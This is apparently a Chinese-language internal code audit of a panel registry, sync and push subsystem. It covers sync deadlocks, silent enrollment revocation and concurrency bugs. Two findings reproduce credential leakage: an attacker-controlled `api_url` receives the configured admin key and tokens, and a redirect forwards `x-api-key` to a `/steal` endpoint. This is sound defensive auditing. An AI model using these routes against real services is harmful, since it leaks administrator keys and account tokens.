# Task 6 — 面板域：注册表、同步、对比、推送

状态: 完成

审计对象：`services/panel_registry.py`、`panel_sync.py`、`panel_push.py`、`panel_enrollment.py`、
`panel_comparison.py`、`panel_comparison_cache.py`、`panel_status_sync.py`、`external_sync.py`、
`api/integrations.py`、`api/platforms.py`。
方法：读码 + 在本机起 `http.server` 假面板（不连任何真实面板/上游）+ 直接调用服务层与端点的
真实代码路径 + 既有测试（155 passed）。只读，未改任何生产/测试/DB 文件。

## 结论

面板域的主干（方向判定 = 凭证比对 + `iat` 优先的时间回落、批量接口的逐条容错、对比缓存
的单飞重建）是**实现完整且有测试钉住**的：`tests/test_panel_time_single_side.py`、
`tests/test_panel_comparison_concurrency.py`、`tests/test_panel_push_endpoint.py` 均通过。
注册表 4 项（不是简报里写的 13 项，13 是 `api/` 模块数与周期任务数，见 PLAN.md:16-18）、
`key`/`url_key` 唯一、`github` 齐全。

但有 3 个真实缺陷让「双向同步」在特定行上**永远不收敛**，其中 2 个我已用真实代码路径复现：
(1) 「登记」闸门与推送方向选择互相锁死（简报点名的「拉回被登记闸门锁死」）；
(2) CPA 的能力声明（只 chatgpt）与对比范围（chatgpt+grok）不一致，导致 Grok 行在 CPA 页面
恒为「未上传」且推送必失败；(3) 远端「读成功但解析出空列表」会静默撤销登记。
另有 2 处凭据外送面（用户可控 `api_url` + 配置口令回落、HTTP 重定向转发 `x-api-key`）已实测复现。

## 发现

### T6-1 · Important · 「登记」闸门与推送方向选择互锁 → 远端较新但未登记的行无路可走

- 位置：`services/panel_sync.py:117-129`（`not_enrolled` 早退）、`services/panel_push.py:163-165`
  （`remote_newer` → `push=False`）、`frontend/src/lib/panelComparison.ts:145-155,217-226`
  （面板页上传只取 `local_only`、推送只取 `local_only`+`local_newer`）。
- 复现（纯函数，2 行输出）：
  - `plan_push({"access_token":"AT-local"}, remote, ...)` → `push=False, reason=remote_newer`
  - `plan_sync(..., panel="chatgpt2api", enrolled=set())` → `pulled=False, reason=not_enrolled`
  - 端点级复现（mock `fetch_panel_raw`）：`POST /sync` → `{pulled:0, skipped:1, enrolled:0,
    candidates:1}`；`POST /push` → `{pushed:0, skipped:1, failed:0}`，item reason `remote_newer`。
- 因果链：登记只由**上传成功**写入（`services/chatgpt_sync.py:114` ← `panel_push.py:511`），
  而「远端较新」的行被推送方向排除，永远不会有成功的上传 → 永远不会登记 →
  `plan_sync` 永远 `not_enrolled`。ADR-0002 的「拉回」对这些行不成立。
- 逃逸口（决定严重度不是 Critical）：账号页的批量动作 `upload_cpa` / `upload_sub2api` /
  `upload_chatgpt2api` 会走 `record_upload_sync` → `_record_sync_result` → `enroll`，
  可以给任意行补登记。但**面板管理页自身**没有任何按钮能救，而页面文案
  （`PanelComparisonPanel.tsx:801`）承诺「未上传的账号将完成登记」——对 `credential_diff`
  且远端较新的行并不成立。
- 爆炸半径：所有「远端先有凭据、本地从未推过」的账号（迁移/换机/远端导入的历史行），
  在面板页表现为「凭证不同 + 远端较新」且无任何可用动作；`enrolled:0` 的提示只说
  「先推送/登记」，而这两个按钮都不包含该行。
- 修复建议：`selectUploadIds` 增补 `credential_diff && remote_newer`（或提供独立的
  「登记到该面板」动作，不要求上传成功）；服务端 `push` 对 `remote_newer` 行提供
  `enroll_only=True` 的分支。同时给 `/sync` 的 `reason` 文案补一句「或到账号页执行上传动作」。

### T6-2 · Important · CPA 能力声明与对比/推送实现不一致：Grok 行恒「未上传」，推送必失败

- 位置：`services/panel_registry.py:72`（`platforms: ["chatgpt"]`、无 grok 的
  `upload_actions`）vs `services/panel_comparison_cache.py:143`（`"cpa": ("chatgpt","grok")`）
  与 `services/panel_comparison.py:657-660,687`（fetcher 缺省取 `codex`+`xai`）。
  失败点是 `services/panel_push.py:389-395`。
- 复现（真实函数）：
  - `build_comparison([grok 本地行], [])` → `state=local_only`
  - `plan_push(...)` → `push=True, reason=not_uploaded`
  - `_push_account_uploader("cpa","grok",row)` → `(False, "Grok 已不再支持 CPA 上传…")`
  - 前端 `shouldShowPlatformFilter(["chatgpt"])` → `False`（我按 `lib/panelComparison.ts:101-107`
    的同逻辑复算），即平台筛选器**不渲染**，用户无法把 Grok 行筛掉。
- 因果链：注册表只声明 chatgpt → 平台筛选器不出现 → 对比表仍渲染 Grok 行（`_PANEL_PLATFORMS`
  含 grok）→ 面板页「推送本地凭据」按钮对这些行 `plan_push=not_uploaded` 成立 →
  `push_local_rows` 的服务端上传器不看 `upload_actions`、直接按平台分发 →
  每行返回 False，汇总进 `failed`。
- 爆炸半径：CPA 面板上全部 Grok 账号（线上实测 213 行里 32 行是 Grok）永远显示「未上传」，
  每次点「推送本地凭据」都会产生 N 条失败并把「更新远程」按钮变成部分失败告警；
  与 `tests/test_panel_management_actions.py:375`（对比覆盖两平台）的意图冲突，但那条测试
  与 `test_cpa_declares_chatgpt_only` 互相矛盾，两条都通过 —— 说明**没有任何测试**
  把「注册表 platforms ⊇ 对比 platforms」钉住（见 T6-8）。
- 修复建议：二选一，把两处对齐 —— (a) `_PANEL_PLATFORMS["cpa"]` 去掉 `"grok"`、
  fetcher 缺省不收 `xai`；或 (b) 注册表补 `"platforms": ["chatgpt","grok"]` 并在
  `upload_actions`/`sync_actions` 里显式给出 grok 的**不可用**声明，让 `push_local_rows`
  按声明过滤而不是靠上传器返回错误。加一条一致性测试：`set(_PANEL_PLATFORMS[k]) ⊆ set(PANELS_BY_KEY[k]["platforms"])`。

### T6-3 · Important · 远端「读成功但解析为空」会静默撤销全部登记

- 位置：`services/panel_sync.py:240-257`（远端无此账号 → `reconcile_with_remote(present=False)`
  → `_persist_extra_only` 落库）配合 `services/panel_comparison.py:740-760`
  （`_sub2api_extract_items` 对未知形状返回 `[]`）与 `services/panel_comparison_cache.py:251-283`
  （解析成功、`remote_error=""`）。
- 复现（假 HTTP 面板返回 `{"code":0,"data":{}}`，200）：
  - `fetch_panel_raw("sub2api")` → `remote_error=''`、`remotes=0`
  - `sync_local_from_remote(rows, [], panel_key="sub2api")` → `{total:0, pulled:0, skipped:0,
    revoked:1}`，落库后的 extra 里 `panel_uploads` 变成 `None`（登记被删）。
- 因果链：解析层把「形状不认识」与「远端真的空」折叠成同一个 `[]`，同步层把
  「远端没有这个账号」当成「远端已删」→ 撤销登记。撤销后该账号**不再参与拉回**，
  恢复只能靠重新推送成功。
- 爆炸半径：任一面板升级/改响应形状、或返回 200 空体（网关错误页被解析成 `{}`）时，
  一次「拉回」就把**该面板全部账号**的登记清空。这是静默的数据破坏，无日志汇总
  （只有逐账号 `logger.warning` 之外的 `revoked` 计数，接口默认不回显）。
- 修复建议：解析层区分「形状不认识」→ 抛 `RuntimeError`（走 `remote_error` 分支）而不是 `[]`；
  `sync_local_from_remote` 只在 `remote_accounts` 非空**且** `remote_error` 为空时执行撤销，
  或把撤销改成显式动作（ADR-0002 的「自动撤销」需要一次确认/上限保护）。

### T6-4 · Important · 用户可控 `api_url` + 配置口令回落 = 把管理员密钥与 AT/RT 送到任意地址

- 位置：`platforms/chatgpt/plugin.py:658-668`（`upload_cpa` 把 `params["api_url"]`、
  `params["api_key"]` 直接透传）→ `platforms/chatgpt/cpa_upload.py:216-232`
  （`api_url` 空才回落配置，`api_key` 空则**回落配置里的真实口令**）；
  `sub2api_upload.py:159-171`、`chatgpt2api_upload.py` 同形。
- 复现（本机 `http.server` 当"攻击者端点"，只传 `api_url`，不传 `api_key`）：
  - `ChatGPTPlatform().execute_action("upload_cpa", acc, {"api_url":"http://127.0.0.1:<port>"})`
    → `ok=True`；攻击者端点收到 `Authorization: Bearer REAL-ADMIN-KEY`（配置口令）
    且 multipart 体里含本地 AT。
  - 同一路径也被 `POST /api/actions/chatgpt/upload_cpa/batch` 使用（`api/actions.py:421`），
    `params` 来自请求体，无任何 URL 校验（全仓无 `urlparse`/私网校验，仅 `solver_manager` 的注释提到 SSRF）。
- 爆炸半径：调用者需先过 `main.py:222-263` 的鉴权（未设密码时仅回环放行，实测非回环 503），
  所以**不是匿名可利用**。但一旦能发一个请求（已登录用户、浏览器里的 XSS/CSRF、或本机任意进程），
  就能借「上传」动作把**配置里的管理员口令**与**账号 AT/RT**外送到任意主机 ——
  口令是全局单例，泄露后可直接管理真实 CPA；且该能力对"上传一个账号"这种低危操作用不上，
  属于典型的权限放大。
- 修复建议：动作参数里禁止覆盖 `api_url`（只允许 `api_key`，且仅在配置为空时允许），
  或对 `api_url` 做白名单（必须与配置地址同源）；`upload_to_*` 在 `api_url` 来自参数时
  **不得**回落配置口令。加回归测试：传陌生 `api_url` + 空 `api_key` 时不得带配置口令。

### T6-5 · Important · 拉取适配器跟随 HTTP 重定向，`x-api-key`/`Authorization` 被转发到新主机

- 位置：`services/panel_comparison.py:790-801`（sub2api 用 `requests.get`，带头 `x-api-key`）、
  `services/panel_comparison.py:1186-1196`（chatgpt2api 用 `requests.get`，头里 `Authorization: Bearer <管理密钥>`）。
  `requests` 默认跟随 302 且**保留自定义头**。
- 复现：假面板 A 返回 `302 Location: http://localhost:<B>/steal`，B 记录头 →
  `fetch_sub2api_remote_accounts(api_url=A, api_key="ADMIN-KEY-PLACEHOLDER")` 后
  B 收到 `x-api-key == ADMIN-KEY-PLACEHOLDER`（实测 `True`）。
- 爆炸半径：一个被劫持/被替换的面板地址（或反向代理配错）即可把管理密钥转交给第三方；
  与 T6-4 叠加时泄露面更大。
- 修复建议：`allow_redirects=False`（或只允许同源重定向），或在 `requests.Session` 上挂
  `rebuild_auth`/重定向钩子剥掉敏感头。

### T6-6 · Important · 拉回的落库失败被计入 `skipped`，与推送的 `failed` 口径不对称

- 位置：`services/panel_sync.py:276-284`（`persist_failed` → `summary["skipped"] += 1`，
  summary 里**没有** `failed` 键）；对照 `services/panel_push.py:197,239-244`（有独立 `failed`）。
- 复现：mock `_persist_local` 抛 `RuntimeError("db locked")` →
  `{total:1, pulled:0, skipped:1}`，`"failed" in summary == False`，item reason
  `persist_failed: RuntimeError`。
- 爆炸半径：数据库写失败（锁/磁盘/会话）在界面上显示成「无需更新」——与
  `panel_push.py:242-243` 明确修过的同类 bug 完全一样，只是方向相反。用户会以为
  「远端没有更新的东西」，实际是本地写入失败。
- 修复建议：summary 增加 `failed`，`persist_failed` 计入 `failed` 而非 `skipped`；
  接口层把 `failed>0` 表面化。（`/sync` 的响应契约要同步加字段。）

### T6-7 · Important · 批量推送无并发去重：同一批账号被重复上传（append 面板产生重复记录）

- 位置：`services/panel_push.py:540-607`（无锁、无幂等键）；append 语义见
  `services/panel_push.py:345-350`（sub2api/chatgpt2api 每次上传新增一条）。
- 复现：两个线程各调一次 `push_local_to_remote(rows, [], upload=...)`，3 行账号 →
  实测 `upload` 被调用 **6 次**（`[0,1,2,0,1,2]`）。
- 爆炸半径：面板页连点两次「推送本地凭据」、或 10 分钟周期的 `*_auto_sync` 与手动推送
  重叠，就在 sub2api / chatgpt2api 上留下重复账号记录；`delete_old` 只删「推送前对比到的」
  那一条，救不了本次新产生的重复。
  对比页缓存有单飞锁（`panel_comparison_cache.py:47-66`），**推送路径没有**，两者不对称。
- 修复建议：按 `(panel, platform, email)` 加进程内 in-flight 去重（或 60s 幂等窗口），
  与对比缓存同一套 `_rebuild_lock` 模式；或者让 append 面板上传前先查重。

### T6-8 · Important · `_MAX_CREDENTIAL_FETCH=200` 截断后无任何告警，超出部分永久「比不了」

- 位置：`services/panel_comparison.py:632`（常量）、`:708`（CPA 静默 `fetched < cap`，
  无 warning —— 对比 chatgpt2api 在 `:1265-1271` **有** warning）。
- 复现：mock `list_auth_files` 返回 250 条 codex 记录、`get_auth_file_credentials` 返回凭据 →
  `fetch_cpa_remote_accounts(emails={250 个})` 得 250 个账号，但只有 **200** 个带 `credentials`。
  这 200 条之外的账号 → `plan_push` 得 `unknown_credential`（不推）、`plan_sync` 得
  `remote_missing_credential`（不拉）。
- 爆炸半径：CPA 上 >200 个「两边都有」的账号时，第 201 个之后的账号永远显示
  「比不了 / 远端无凭证」，两个方向都不动，且日志里没有任何原因（grok2api 的导出是
  一次性全量，不受影响；chatgpt2api 至少会 warning）。
- 修复建议：CPA 分支补与 chatgpt2api 同形的 `logger.warning`，并把截断计数放进
  comparison payload（如 `credential_truncated: N`）让界面显示；或改成分批按需拉取。

### T6-9 · Low · 注册表 `secret_key` 缺 grok2api，`/panels` 的 `secret_set` 对它恒为 False

- 位置：`services/panel_registry.py:96-105`（grok2api 项无 `secret_key`，但实际需要
  `grok2api_password`，见 `core/config_schema.py:111`、`services/panel_comparison_cache.py:171-173`）；
  `api/integrations.py:57-63` 由 `secret_key` 推导 `secret_set`。
- 复现：`get_panels()`（mock `config_store.get_all` 带上 `grok2api_password`）→
  `grok2api secret_key=None, secret_set=False`，而同一次调用里 `cpa secret_set=True`。
- 爆炸半径：`GET /api/integrations/panels` 对 grok2api 声称「没有口令」，与配置页
  （`PanelConfigPanel.tsx:336` 用 `grok2api_password_set`）口径不一致；当前面板管理页
  不消费 `secret_set`，所以只是契约层错误，未造成界面错显。
- 修复建议：注册表补 `"secret_key": "grok2api_password"`（`secret_label`/`secret_placeholder` 同形）。
  注意 `test_secret_key_when_present_is_a_string` 只校验「给了就必须是字符串」，
  不校验「需要口令的面板必须给」—— 补一条覆盖。

### T6-10 · Low · 验证缺口（无测试、也无法从外部观测的分支）

1. 撤销登记端到端：`tests/test_panel_enrollment.py` 只单测 `reconcile_with_remote`，
   没有测「`sync_local_from_remote` 在远端解析为空时会撤销」——正是 T6-3 的现场。
   同理，`tests/test_panel_sync_endpoint.py` 的两个拉回用例都**预置了** `panel_uploads`
   （`:37`、`:117`、`:162`），于是 T6-1 的「远端较新但未登记」路径在端点级零覆盖。
2. 注册表 `platforms` ⊇ `_PANEL_PLATFORMS` 的一致性：两条互相矛盾的测试同时通过（T6-2）。
3. 推送路径的并发/幂等：`tests/test_panel_comparison_concurrency.py` 只覆盖**对比缓存**，
   推送与拉回没有任何并发测试（T6-7）。
4. 上传动作的 `api_url` 覆盖与口令回落：无测试（T6-4）；重定向敏感头转发：无测试（T6-5）。
5. `_MAX_CREDENTIAL_FETCH` 截断：无测试（T6-8）。
6. `/sync` 的 `failed` 语义：`tests/test_panel_sync_endpoint.py` 只断言 `pulled`/`skipped`。

## hypothesis

（以下未复现或不构成可复现缺陷，仅记录为假设，不计 Critical/Important。）

- H1 `services/panel_sync.py:91` 在模块中部 `from services.panel_enrollment import ...`：
  当前不构成循环导入（已实测 `import services.panel_sync` 成功），但把依赖藏在文件中部，
  与文件头 docstring 声明的「纯函数模块」不符，属风格问题。
- H2 `parse_timestamp("0")` 会得到 1970-01-01（`_from_epoch(0.0)`），若某面板用 `0`
  表示「无时间」，该行会被判成「极旧」而不是「无时间」。未在任何 fetcher 的实测形状里见到，未复现。
- H3 `apply_pull` 只写规范名（`access_token`），保留本地遗留的 camelCase 键
  （实测 merge 后 `accessToken` 仍是旧值）。当前所有读路径 `get_credential` 先读规范名，
  所以不会读错；但导出/外部消费方若只读 camelCase 会拿到过期值。未找到真实消费方，未升级。
- H4 面板页「推送本地凭据」与后端 `/push` 的账号集合来源不同（前端按 `state/time_relation`
  选，后端按 `plan_push` 重新判定）。理论上不一致会导致「看到的 ≠ 被改的」，但两端判定
  同源（都读对比行的 state/time_relation 与同一 `plan_push`），未构造出差异。

## 覆盖清单（注册表 / 同步方向 / 对比判定 / 并发与失败聚合）

### 注册表（`services/panel_registry.py`、`api/integrations.py`、`api/platforms.py`）

- 条目数 = 4（cpa / sub2api / grok2api / chatgpt2api）。**简报与 PLAN.md:110 的「13 个面板」
  与实际不符**；13 指 `api/` 下的模块数与周期任务数（PLAN.md:16-18）。已核实
  `PANELS` 长度 = 4、`PANELS_BY_KEY` = 4、`FETCHERS` = 4、`_PANEL_PLATFORMS` = 4。
- `key` 唯一、`url_key` 唯一、`github` 全为 `https://github.com/...`：
  `tests/test_panel_registry.py::test_panel_keys_are_unique`、
  `test_url_keys_are_unique_except_declared_sharing`、`test_github_links_point_at_github` 通过。
- 能力声明 vs 实现：`tests/test_panel_management_actions.py::test_declared_actions_exist_on_the_platform`
  通过（动作 id 在对应平台存在）；但**没有**测试校验「注册表 platforms / upload_actions 与
  对比范围 `_PANEL_PLATFORMS` 一致」→ T6-2。
- `secret_key` 完整性：cpa/sub2api/chatgpt2api 有，grok2api 缺 → T6-9。
- `GET /api/integrations/panels`：`tests/test_panel_registry.py::test_endpoint_never_returns_secret_values`
  通过（实测响应只含 `secret_set` 布尔）。`api/platforms.py` 10 行，直通
  `core.registry.list_platforms()`；实测未加载插件时返回 `[]`、无凭据字段（干净）。

### 同步方向语义（push / pull / 登记 enroll）

- push：`plan_push` 只推 `local_only` 与 `local_newer`；`remote_newer`/`synced`/
  `unknown_credential`/`unknown_time`/`banned` 全部不动 —— 单测
  `tests/test_panel_push.py` 覆盖，我另用真实函数逐分支复算一致。
- pull：`plan_sync` 只拉 `remote_newer`；`banned` / `remote_missing_credential` /
  `not_enrolled` 早退 —— `tests/test_panel_sync.py` 覆盖。
- 幂等：push 对 overwrite 面板（cpa/grok2api）按邮箱原地覆盖 → 重推幂等；
  append 面板（sub2api/chatgpt2api）靠 `delete_old` 删旧记录 → 逻辑上幂等，
  但**并发下不幂等**（T6-7）。
- enroll：只在成功时写（`panel_enrollment.py:59-87`，`tests/test_panel_enrollment.py:31-46` 通过）；
  失败只更新 `last_attempt_ok` 诊断位、不建登记 —— 与 `chatgpt_sync.py:104-126` 一致。
- **闸门活锁：成立**（T6-1）。这是简报点名的「拉回被登记闸门锁死」，我确认它在
  「远端较新 + 从未推送」的行上真实存在，且面板页无出口（账号页动作可救）。

### 对比判定（`iat` 缺失时的回落）

- 两侧都有 `iat` → 秒级比（`compare_credential_time`，`test_both_sides_iat_still_wins_over_record_time`）。
- 单侧有 `iat` → 该侧用 `iat`、另一侧回落**该侧**记录时间，整体降为小时级
  （实测：本地 iat=10-02 vs 远端记录=10-04 → `remote_newer`，basis=`mixed`；
  与 `tests/test_panel_time_single_side.py:62,82,192,243` 一致）。
- 两侧都无 `iat` → 两侧记录时间、小时级；同小时 → `time_synced`（不覆盖本地，保守）。
- 至少一侧连记录时间都没有 → `""` → 调用方 `unknown_time` 不动（`:103` 测试 + 我复算）。
- 文档承诺的「每侧独立 iat 优先、无则回落」**确实实现**（`panel_comparison.py:249-264`），
  且 `credential_time_basis` 的 `credential/mixed/record` 三态与实现一致 —— 这一项**验证通过**。
- 对比主判据 `compare_credentials` 只比「两边都有值」的字段（`:143-157`）；远端多一个 ST
  而本地只有 AT 时判 `synced`（实测），这是 docstring 明示的保守口径，非缺陷。

### 并发与失败聚合

- 对比缓存：单飞重建 + 失败条目 5s TTL（`panel_comparison_cache.py:47-90`），
  `tests/test_panel_comparison_concurrency.py` 覆盖 —— **通过**。
- 批量推送：逐条 `try/except`，单账号异常不毁整批；`failed` 与 `skipped` 分账
  （`panel_push.py:222-247`，`test_panel_push_endpoint.py::test_pushes_local_newer_and_reports`）—— **通过**。
- 批量拉回：逐条容错成立，但落库失败计入 `skipped` 且无 `failed` 键 → T6-6。
- 推送路径无并发去重 → T6-7（实测 2 并发 × 3 行 = 6 次上传）。
- 状态同步批量：远端失败时对每个账号统一返回 `unreachable`（`panel_status_sync.py:216-229`），
  一个面板失败不影响其它面板（每面板一次独立调用）；`test_panel_status_sync.py` 覆盖分类，
  聚合口径经 `api/actions.py:186-236` 逐条计分 —— **通过**。
- 自动同步：`run_panel_auto_sync` 捕获异常不让调度线程崩（`services/chatgpt_maintenance.py:444-453`），
  未知面板返回空结果而非抛错 —— **通过**。

### 未覆盖 / 未验证

- 真实面板协议（未连任何真实面板，全部用本机假服务器与 mock）。
- `external_sync.py` 的贡献服务器分支（`custom_contribution_url` 同样无校验、
  `:222` 带 `Authorization: Bearer <token>`；未复现为独立缺陷，已并入 T6-4 的口径）。
- 前端渲染的端到端行为（只做纯函数与静态接线校验，未起浏览器）。